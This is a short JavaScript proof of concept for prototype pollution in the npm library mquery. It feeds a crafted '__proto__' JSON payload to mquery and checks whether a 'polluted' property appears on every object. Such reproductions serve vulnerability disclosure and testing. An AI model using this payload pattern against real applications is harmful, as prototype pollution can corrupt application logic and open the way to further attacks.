Object.prototype.hasOwnProperty.call = () => true;
const mquery = require('mquery');
let obj = {};
var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
console.log({}.polluted);
var m = mquery(payload);
console.log({}.polluted);